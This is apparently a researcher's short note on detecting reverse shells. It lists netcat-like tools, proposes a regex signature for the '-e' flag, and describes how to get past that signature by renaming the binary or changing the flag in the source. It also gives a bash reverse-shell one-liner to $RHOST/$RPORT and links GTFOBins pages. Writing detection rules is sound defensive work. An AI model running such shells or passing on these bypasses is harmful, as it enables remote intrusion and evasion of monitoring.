# Netcat
Execute netcat / ncat / nc with flag -e which usually execute shell (/bin/bash, /bin/zsh). However there are many different interpreters can be executed. Better to "detect" the -e flag as dangerous signature
netcat and forked packages on repository:
- cryptcat
- dbd
- ncat
- netcat
- netcat-openbsd
- netcat-traditional
- powercat
- pwncat
- sdb
- socat
Bypass: copy, change file name to different name. For example, signature should be "ncat|netcat|nc[\S]+\-e". Bypass method can be `random_name -e /bin/randomshell`
More advanced attack could be change source code, change flag -e to different flag

# Shells
https://gtfobins.github.io/gtfobins/bash/
- bash: bash -c `exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1`. The -i means the shell is interactive

# Interpreters
- cpan (perl like) https://gtfobins.github.io/gtfobins/cpan/
- easy_install (python) https://gtfobins.github.io/gtfobins/easy_install/
- https://gtfobins.github.io/gtfobins/php/
- https://gtfobins.github.io/gtfobins/jrunscript/

# Command execute
- https://gtfobins.github.io/gtfobins/gimp/